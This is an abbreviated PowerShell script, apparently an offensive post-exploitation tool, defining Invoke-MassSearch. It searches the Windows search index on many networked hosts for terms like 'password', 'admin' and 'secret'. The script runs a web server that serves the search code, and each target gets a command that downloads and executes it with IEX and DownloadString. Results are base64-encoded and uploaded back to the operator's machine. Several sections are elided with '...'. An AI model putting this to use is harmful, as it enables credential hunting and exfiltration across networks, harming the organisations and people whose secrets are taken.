<#
    ...
    adaptation by @lxrd-mgcini
#>



function Invoke-MassSearch {
    <#
        .SYNOPSIS
        Runs Get-IndexedItem across multiple machines in order
        to search for specific terms from the windows search
        indexer. The output is saved directly back to
        ...
        Credit to James O'Neill

        .PARAMETER Hosts
        Array of host names to run Invoke-MassSearch on,
        passable on the pipeline.

        .PARAMETER HostList
        List of host names to run Invoke-MassSearch on.

        .PARAMETER Terms
        Terms to query the search indexer for. Defaults to 
        "pass","password","sensitive","admin","login", and "secret".
        ...
        Folder to pipe host outputs to. Defaults to 'SearchOutput'.
    ...
    param(
        ...
        [String[]]
        $Terms = @("pass", "password", "sensitive", "admin", "login", "secret"),
    ...
    begin {
        ...
        #     Distribuetd under: MICROSOFT LIMITED PUBLIC LICENSE version 1.1
        $WebserverScriptblock = {
            param($Terms, $LocalPort, $OutputFolder)
            $Terms2 = $Terms -split ' ' -join ','
            $HostedScript = 
            @'
...
$o = Get-IndexedItem -Terms 
'@
            $HostedScript += $Terms2 + @'
 | Select-Object FullName, COMPUTERNAME, FILEOWNER, Length, CreationTime, LastAccessTime, LastWriteTime, AUTOSUMMARY, FileAttributes
if($o){
    $o
}
'@
            ...
            while ($Hso.IsListening) {
                ...
                # process any POST results from the invoked script
                    ...
                    if (($output) -and ($output.Length -ne 0)) {
                        ...
                        $OutFile = $OutputFolder + "\$($hostname).csv"
        ...
        Start-Job -Name WebServer -Scriptblock $WebserverScriptblock -ArgumentList $Terms, $LocalPort, $OutputFolder | Out-Null
    ...
    process {
        ...
        $hosts | % {
            $command = "IEX (New-Object Net.Webclient).DownloadString('http://" + $LocalIpAddress + ":$LocalPort/update') | ConvertTo-Csv -NoTypeInformation | % {[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$_))} | % {(new-object net.webclient).UploadString('http://" + $LocalIpAddress + ":$LocalPort/$_', `$_)}"
